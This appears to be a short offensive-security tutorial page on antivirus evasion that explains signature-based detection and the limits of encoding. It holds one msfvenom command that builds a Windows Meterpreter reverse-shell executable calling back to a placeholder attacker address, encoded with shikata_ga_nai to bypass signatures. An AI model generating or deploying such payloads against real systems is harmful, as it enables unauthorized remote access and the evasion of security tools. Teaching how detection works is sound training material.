AV Evasion

AV Evasion Fundamentals: Signature-Based Detection

Modifying payloads to bypass known malicious patterns.

How Signature Detection Works

  • **Known Patterns:** AV maintains databases of malicious file hashes and byte sequences.
  • **Direct Comparison:** Scans files and processes, comparing their content against these signatures.
  • **Immediate Flagging:** If a match is found, the file is immediately identified as malware.
  • **Static Analysis:** Primarily focuses on the static content of the file before execution.
Analogy

Like a fingerprint database, matching known criminal fingerprints to new suspects.

Basic Evasion: `msfvenom` Encoding

# Generate a Windows Meterpreter payload with Shikata Ga Nai encoder
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=<PORT> \
  -f exe \
  -e x86/shikata_ga_nai \
  -i 10 \
  -o payload.exe

# Limitations:
# - Common encoders are easily detected by modern AV.
# - Signature updates quickly nullify their effectiveness.
# - Still leaves recognizable patterns for advanced AV.
Common Mistake

Over-reliance on simple `msfvenom` encoders for modern AV evasion. They are often quickly flagged.

Key Takeaway

While `msfvenom` encoding can modify signatures, it's generally insufficient for bypassing modern AV due to rapid detection of common encoder outputs. More advanced techniques are required.
